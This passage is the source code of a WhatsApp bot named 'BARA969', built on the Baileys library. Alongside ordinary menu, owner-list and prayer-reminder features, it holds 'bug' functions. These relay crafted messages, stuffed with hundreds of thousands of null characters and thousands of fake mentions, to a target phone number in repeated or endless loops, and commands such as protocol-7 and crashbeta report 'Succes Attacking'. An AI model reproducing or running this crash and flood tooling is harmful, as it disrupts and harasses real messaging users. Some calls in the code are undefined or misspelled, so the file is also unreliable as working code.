require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');


const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContetInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');

module.exports = famzz = async (famzz, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? famzz.user.id.split(":")[0] + "@s.whatsapp.net" || famzz.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const owner = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
const premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
const isPremium = premium.includes(m.sender)
const isCreator = await famzz.decodeJid(famzz.user.id);
const isOwner = [isCreator, ...owner, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await famzz.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(isCreator) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(isCreator) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
    
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");


// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
famzz.autoshalat = famzz.autoshalat ? famzz.autoshalat : {}
    let id = m.chat
    if (id in famzz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        famzz.autoshalat[id] = [
            famzz.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: false,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./stories/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete famzz.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

  const fkontak = {
  key: {
    fromMe: false,
    participant: "6285194938724@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: { Url: "https://img1.pixhost.to/images/6076/604846252_vynx.jpg" },
      itemCount: "2010",
      status: "INQUIRY",
      surface: "CATALOG",
      message: "RAMZ OFFICIAL",
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["6285194938724@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
  
const PayX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { Url: "https://img1.pixhost.to/images/6076/604846252_vynx.jpg" },
					"thumbnailUrl": "https://img1.pixhost.to/images/6076/604846252_vynx.jpg",
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Sender : @${pushname}\nCommand : ${command}`,
					"orderTitle": "© RAMZ OFFICIAL", 
					"sellerJid": "18002428478@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "USD"
				}
			}
		}

//Done Resp
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `
— ⧼ \`Succes Attacking\` ⧽ —
╭─────────────⌑
│ Sender : ${pushname}
│ Target : ${pepec}
│ Command : ${command}
╰─────────────⊱

\`\`\`please pause 5 minutes\`\`\`` 

let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "back" } }
    ];

    let buttonMessage = {
        image: {url: "https://img1.pixhost.to/images/6076/604846252_vynx.jpg"},
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363420771480965@newsletter",
                newsletterName: "𝚂𝙷𝙰𝙳𝙾𝚆 𝙳𝙴𝙰𝚃𝙷"
            }
        },
        footer: global.footer,
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await famzz.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
await famzz.sendMessage(m.chat, {audio: fs.readFileSync('./media/bugs.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: PayX})
} 
//Proses Respone
 async function prosesress () {
if (!q) throw "Proses Response"
let pepec = q.replace(/[^0-9]/g, "")
let prosesres = `
— ⧼ \`Proses Attacking\` ⧽ —
╭─────────────⊱
│ Target : ${pepec}
│ Status : proses attacking
╰─────────────⊱

\`\`\`proses attacking, wait a moment\`\`\`` 

let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "back" } }
    ];

    let buttonMessage = {
        image: {url: "https://img1.pixhost.to/images/6076/604846252_vynx.jpg"},
        caption: prosesres,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363420771480965@newsletter",
                newsletterName: "𝚂𝙷𝙰𝙳𝙾𝚆 𝙳𝙴𝙰𝚃𝙷"
            }
        },
        footer: global.footer,
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await famzz.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}        
 
//FUNCTION BUG
async function delayBkp(famzz, target) {
  const msgx = {
    viewOnceMessage: {  
      message: {  
        interactiveResponseMessage: {  
          body: {  
            text: " kelra - execute ",  
            hasMediaAttachment: false  
          },  
          imageMessage: {  
            url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",  
            mimetype: "image/jpeg",  
            fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",  
            fileLength: "11887",  
            height: 1080,  
            width: 1080,  
            mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",  
            fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",  
            directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",  
            mediaKeyTimestamp: "1750124469",  
            contextInfo: {  
              forwardingScore: 9999,  
              isForwarded: true,  
              mentionedJid: [  
                "0@s.whatsapp.net",  
                ...Array.from(  
                  { length: 1900 },  
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                )  
              ],  
              expiration: 9741,  
              ephemeralSettingTimestamp: 9741,  
              entryPointConversionSource: "WhatsApp.com",  
              entryPointConversionApp: "WhatsApp",  
              entryPointConversionDelaySeconds: 9742,  
              disappearingMode: {  
                initiator: "INITIATED_BY_OTHER",  
                trigger: "ACCOUNT_SETTING"  
              }  
            },  
            scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",  
            scanLengths: [2071, 6199, 1634, 1983],  
            midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="  
          },  
          nativeFlowResponseMessage: {  
            name: "address_message",  
            paramsJson: "\u0000".repeat(1045900),  
            version: 3  
          }  
        }  
      }  
    }  
  };

  const kelra = generateWAMessageFromContent(target, msgx, {});

  await famzz.relayMessage("status@broadcast", kelra.message, {
    messageId: kelra.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}


async function DelayInvisBapakLowh(famzz, target) {
  while (true) {
    try {   
      const VnfMsg = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {                     
              body: {
                text: ".../",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "cta_Vnf",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                version: 3
              }
            }
          }
        }
      };

      await famzz.relayMessage(target, VnfMsg, { 
        participant: { jid: target } 
      });
      
      console.log(`Delay Hard successfully spammed to ${target}`);

      await new Promise(resolve => setTimeout(resolve, 1500));

    } catch (e) {
      console.log("❌ Error Strike:", e);
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}

async function delayditz(target) {
  try {
    var msg = generateWAFromConnect(target, {
  groupStatusMessageV2: {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from(
          { length: 2000 },
          (_, i) => `628905529731${i + 1}@s.whatsapp.net`
        )
      },
      body: { 
        text: "Maklu Delay", 
        format: "DEFAULT" 
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`,
        version: 3
      }
    }
  }
    });
    await famzz.relayMessage(target, msg, { messageId: msg.key.id,
      participants: { jid: target }
    })
    
    conlose.log(chalk.grenn(`Sukses Bug To : ${target}`))
  } catch (err) {
    console.error(`Eror Dev : ${err}`)
  }
} 
//end func
// Comm handler
switch (command) {

case 'menu':{
let teks = `𝙱𝙰𝚁𝙰𝟿𝟼𝟿 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 𝟷.𝟶


こんにちは、私はIによって作られた𝐁𝐀𝐑𝐀𝟗𝟔𝟗です。誤用しないでください。

\INFORMATION\
- Developer : Bara Pengen Sigma
- Name bot : BARA969
- Version : 1.0.0
- Type case : JavaScript


[ .allmenu ]
[ .bugmenu ]
[ .ownermenu ]

⌈ \`\`\`BACK FOR MY PRIME😹😂
\`\`\` ⌋
\`\`\`SIGAMAA😹\`\`\`
`
famzz.sendMessage(m.chat, {
  footer: "~ BARA PENGEN MELETUP", 
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'ɑll feɑture' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select this menu',
          sections: [
            {
              title: 'Garsel',
              highlight_label: 'POWER SHADOW',
              rows: [
                {
                  title: 'BUG MENU',
                  id: '.bugmenu'  
                  },                
                 {
                  title: '𝐌𝐄𝐍𝐔 𝐎𝐖𝐍𝐄𝐑',
                  id: '.ownermenu'
                },
                 {
                  title: '𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫',
                  id: '.owner'
                },
                  {
                  title: '𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎',
                  id: '.tqto'
                }
              ]
            }
          ]
        })
      }
      }
  ],
          
headerType: 1,
  viewOnce: true,
       image: { url: "https://img1.pixhost.to/images/6076/604846252_vynx.jpg" },
      gifPlayback: true,
        caption: teks,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "𝙱𝙰𝚁𝙰𝟿𝟼𝟿",
                newsletterJid: `12036342077140965@newsletter`,
            },
            externalAdReply: {  
             title: "𝙱𝙰𝚁𝙰𝟿𝟼𝟿",
              body: "6283172030829",
                thumbnailUrl: "https://img1.pixhost.to/images/6076/604846252_vynx.jpg",
                sourceUrl: "https://whatsapp.com/channel/0029Vb6OBghDTkJwEU2C", 
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: fkontak
                    })
            await sleep(2500)
famzz.sendMessage(m.chat, {
audio: fs.readFileSync('./media/menu.mp3'),
mimetype: 'audio/mp4',
ptt: true
},{
quoted: PayX
})
}
break
     
case 'allmenu':{
let teks = `𝙱𝙰𝚁𝙰𝟿𝟼𝟿 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 𝟷.𝟶

こんにちは、私はIによって作られた𝐁𝐀𝐑𝐀𝟗𝟔𝟗です。誤用しないでください

\INFORMATION\
- Developer : Bara Pengen Sigma
- Name bot : BARA969
- Version : 1.0.0
- Type case : JavaScript

＊ 𝐁𝐔𝐆 𝐃𝐄𝐋𝐀𝐘 
➩ .invisible
➩ .xinvis
➩ .protocol-7 
➩ .blankshadow
➩ .invisturbo
➩ .crashbeta
➩ .😈

＊ 𝐁𝐔𝐆 𝐂𝐑𝐀𝐒𝐇
➩ .𝙲𝚁𝙰𝚂𝙷𝚄𝙸

＊ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔
➩ .addowner
➩ .delowner
➩ .addmurbug
➩ .delmurbug
➩ .public/self
➩ .reactch
➩ .buatgroup 
`
const buttons = [
      { buttonId: ".menu", buttonText: { displayText: "𝐁𝐀𝐂𝐊" }, type: 1 },
      { buttonId: ".owner", buttonText: { displayText: "𝐎𝐖𝐍𝐄𝐑" }, type: 1 },
      { buttonId: ".tqto", buttonText: { displayText: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎" }, type: 1 }
    ];
          
const buttonMessage = {
        image: { url: "https://img1.pixhost.to/images/6076/604846252_vynx.jpg" },
        caption: teks, 
        footer: "~ 𝙱𝙰𝚁𝙰𝟿𝟼𝟿",
        headerType: 1,
        buttons: buttons,
        viewOnce: true,
        contextInfo: {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '12036342071480965@newsletter',
                newsletterName: '𝙱𝙰𝚁𝙰𝟿𝟼𝟿'
            }
        }
    };

    await famzz.sendMessage(m.chat, buttonMessage, { quoted: PayX });
};
break
case 'bugmenu':
case 'garselmenu':{
let teks = `𝙱𝙰𝚁𝙰𝟿𝟼𝟿 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 𝟷.𝟶


こんにちは、私はIによって作られた𝐁𝐀𝐑𝐀𝟗𝟔𝟗です。誤用しないでください。

\INFORMATION\
- Developer : Bara Pengen Sigma
- Name bot : BARA969
- Version : 1.0.0
- Type case : JavaScript


＊ 𝐁𝐔𝐆 𝐃𝐄𝐋𝐀𝐘 
➩ .invisible
➩ .xinvis
➩ .protocol-7 
➩ .blankshadow
➩ .invisturbo
➩ .crashbeta
➩ .😈

＊ 𝐁𝐔𝐆 𝐂𝐑𝐀𝐒𝐇
➩ .𝙲𝚁𝙰𝚂𝙷𝚄𝙸
`
const buttons = [
      { buttonId: ".menu", buttonText: { displayText: "𝐁𝐀𝐂𝐊" }, type: 1 },
      { buttonId: ".tqto", buttonText: { displayText: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎" }, type: 1 }
    ];
          
const buttonMessage = {
        image: { url: "https://img1.pixhost.to/images/6076/604846252_vynx.jpg" },
        caption: teks, 
        footer: "~ 𝙱𝙰𝚁𝙰𝟿𝟼𝟿",
        headerType: 1,
        buttons: buttons,
        viewOnce: true,
        contextInfo: {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '12036342077148965@newsletter',
                newsletterName: '𝙱𝙰𝚁𝙰𝟿𝟼𝟿'
            }
        }
    };

    await famzz.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
};
break
case 'ownermenu':{
let teks = `𝙱𝙰𝚁𝙰𝟿𝟼𝟿 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 𝟷.𝟶


こんにちは、私はIによって作られた𝐁𝐀𝐑𝐀𝟗𝟔𝟗です。誤用しないでください。


\INFORMATION\
- Developer : Bara Pengen Sigma
- Name bot : BARA969
- Version : 1.0.0
- Type case : JavaScript


＊ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔
➩ .addowner
➩ .delowner
➩ .addmurbug
➩ .delmurbug
➩ .public/self
➩ .reactch
➩ .buatgroup 
`
const buttons = [
      { buttonId: ".menu", buttonText: { displayText: "𝐁𝐀𝐂𝐊" }, type: 1 },
      { buttonId: ".contact", buttonText: { displayText: "𝐎𝐖𝐍𝐄𝐑" }, type: 1 }
    ];
          
const buttonMessage = {
        image: { url: "https://img1.pixhost.to/images/6076/604846252_vynx.jpg" },
        caption: teks, 
        footer: "~ 𝙱𝙰𝚁𝙰𝟿𝟼𝟿", 
        headerType: 1,
        buttons: buttons,
        viewOnce: true,
        contextInfo: {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '1203634207480965@newsletter',
                newsletterName: '𝙱𝙰𝚁𝙰𝟿𝟼𝟿'
            }
        }
    };

    await famzz.sendMessage(m.chat, buttonMessage, { quoted: PayX });
};
break

case 'public': {
if (!isOwner) return m.reply('Own Only') 
famzz.public = true
m.reply('Sukse Change To Public')
}
break

case 'self': {
if (!isOwner) return m.reply('Own Only') 
famzz.public = false
m.reply('Sukses Change To Self')
}
break
case 'addprem': case 'addmurbug': {
if (!isOwner) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} number\nContoh ${prefix+command} 62xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await famzz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))
m.reply(`number ${prrkek} succesfully added to database!!`)
    }
break
case 'addowner':
if (!isOwner) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} number\nContoh ${prefix+command} 62xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await famzz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
owner.push(prrkek)
fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(owner))
m.reply(`number ${prrkek} succesfully added to database!!`)
break


case 'delmurbug':case 'delprem':
if (!isOwner) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 62xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))
m.reply(`succesfully deleted number ${ya}`)
break
case 'delown':case 'delowner':
if (!isOwner) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 62xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(owner))
m.reply(`succesfully deleted number ${ya}`)
break
case 'protocol-7': {
if (!isCreator && !isPremium) return m.reply(mess.murbug);


  if (!q) return m.reply(`Contoh: ${prefix + command} 62xxxx`);
  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const pureTarget = target.split("@")[0]; // Ambil hanya angkanya



  const prosesText = `╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`;

  await famzz.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: prosesText,
    gifPlayback: true,
  }, { quoted: lol });

  for (let i = 0; i <  300; i++) {
    await delayBkp(famzz, target);
    await sleep(3000);
    await delayBkp(famzz, target);
    await sleep(3000);
    await delayBkp(famzz, target);
    await sleep(3000);
    await delayditz(target);
    await sleep(3000);
}


  const selesaiText = `╔═━━「 𝗦𝘂𝗰𝗲𝘀𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`;

  await famzz.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: selesaiText,
    gifPlayback: true,
  }, { quoted: lol2 });
}
break;
case 'invisible':
case 'blankshadow':
case '😈':
case 'invisturbo':
case 'crashbeta':
case 'xinvis': {
if (!isCreator && !isPremium) return m.reply(mess.murbug);


  if (!q) return m.reply(`Contoh: ${prefix + command} 62xxxx`);
  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const pureTarget = target.split("@")[0]; // Ambil hanya angkanya


  const prosesText = `╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`;

  await famzz.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: prosesText,
    gifPlayback: true,
  }, { quoted: lol });

  for (let i = 0; i <  300; i++) {
    await DelayInvisBapakLowh(famzz, target);
    await sleep(3000);
    await DelayInvisBapakLowh(famzz, target);
    await sleep(3000);
    await DelayInvisBapakLowh(famzz, target);
    await sleep(3000);
    await DelayInvisBapakLowh(famzz, target);
    await sleep(3000);
    await DelayInvisBapakLowh(famzz, target);
    await sleep(3000);
    await DelayInvisBapakLowh(famzz, target);
    await sleep(3000);
    await delayditz(target);
    await sleep(3000);
    
}


  const selesaiText = `╔═━━「 𝗦𝘂𝗰𝗲𝘀𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`;

  await famzz.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: selesaiText,
    gifPlayback: true,
  }, { quoted: lol2 });
}
break;
case 'reactch': {
    if (!args[0] || !isOwner) {
        return m.reply("Contoh penggunaan:\n.reactch https://whatsapp.com/channel/xxxx woi ini ambatukam");
    }

    if (!args[0].startsWith("https://whatsapp.com/channel/")) {
        return m.reply("Link tautan tidak valid.");
    }

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return hurufGaya[c] || c;
    }).join('');

    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];

        const res = await famzz.newsletterMetadata("invite", channelId);
        await famzz.newsletterReactMessage(res.id, messageId, emoji);

        return m.reply(`Berhasil mengirim reaction *${emoji}* ke pesan di channel *${res.name}*`);
    } catch (e) {
        console.error(e);
        return m.reply("Gagal mengirim reaction. Pastikan link dan emoji valid.");
    }
};
break
 case 'owner': case 'contact': {
    famzz.sendMessage(m.chat, { react: { text: "👤", key: m.key } });

    let menu = `
*Hallo👋🏻 ${pushname} disini ada channel dan nomor pembuat script, ada yang bisa di bantu?*
    `;

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                            newsletterName: `𝙱𝙰𝚁𝙰𝟿𝟼𝟿`,
                            newsletterJid: "1203634207480965@newsletter",
                            serverMessageId: 143
                        },
                        businessMessageForwardInfo: { businessOwnerJid: famzz.decodeJid(famzz.user.id) },
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "~ 𝙱𝙰𝚁𝙰𝟿𝟼𝟿 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 𝟷.𝟶"
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://wa.me/6283172030829\",\"merchant_url\":\"https://wa.me/6283172030829\"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"Channel Developer\",\"url\":\"https://whatsapp.com/channel/0029VbBSBKRCMY0ACjDO36\",\"merchant_url\":\"https://wa.me/6283172030829\"}`
                            }
                        ],
                    })
                })
            }
        }
    }, {});

